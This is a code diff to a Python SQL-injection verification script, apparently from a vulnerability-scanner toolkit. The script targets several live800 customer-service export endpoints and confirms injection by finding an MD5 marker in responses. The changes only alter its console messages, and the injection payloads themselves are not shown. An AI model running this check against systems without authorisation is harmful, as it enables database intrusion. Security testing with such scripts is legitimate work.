@@ -42,10 +42,12 @@ class live800_sta_export_sqli_BaseVerify:
             req = requests.post(vulnurl, headers=headers, data=payload, timeout=10, verify=False)
 
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
-                cprint("[+]存在live800在线客服系统SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\tpost: "+json.dumps(payload), "red")
+                cprint("[+]存在live800在线客服系统SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(payload, indent=4), "red")
+            else:
+                cprint("[-]不存在live800_sta_export_sqli漏洞", "white", "on_grey")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
         headers={
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
@@ -69,10 +71,12 @@ class live800_sta_export_sqli_BaseVerify:
             req = requests.post(vulnurl, headers=headers, data=payload, timeout=10, verify=False)
 
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
-                cprint("[+]存在live800在线客服系统SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\tpost: "+json.dumps(payload), "red")
+                cprint("[+]存在live800在线客服系统SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(payload, indent=4), "red")
+            else:
+                cprint("[-]不存在live800_sta_export_sqli漏洞", "white", "on_grey")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
         turl = "/live800/sta/export/chatHoursSta.jsp"
         vulnurl = self.url + turl
@@ -89,10 +93,12 @@ class live800_sta_export_sqli_BaseVerify:
             req = requests.post(vulnurl, headers=headers, data=payload, timeout=10, verify=False)
 
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
-                cprint("[+]存在live800在线客服系统SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\tpost: "+json.dumps(payload), "red")
+                cprint("[+]存在live800在线客服系统SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(payload, indent=4), "red")
+            else:
+                cprint("[-]不存在live800_sta_export_sqli漏洞", "white", "on_grey")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
         turl = "/live800/sta/export/chatUrlSta.jsp"
         vulnurl = self.url + turl
@@ -109,10 +115,12 @@ class live800_sta_export_sqli_BaseVerify:
             req = requests.post(vulnurl, headers=headers, data=payload, timeout=10, verify=False)
 
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
-                cprint("[+]存在live800在线客服系统SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\tpost: "+json.dumps(payload), "red")
+                cprint("[+]存在live800在线客服系统SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(payload, indent=4), "red")
+            else:
+                cprint("[-]不存在live800_sta_export_sqli漏洞", "white", "on_grey")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
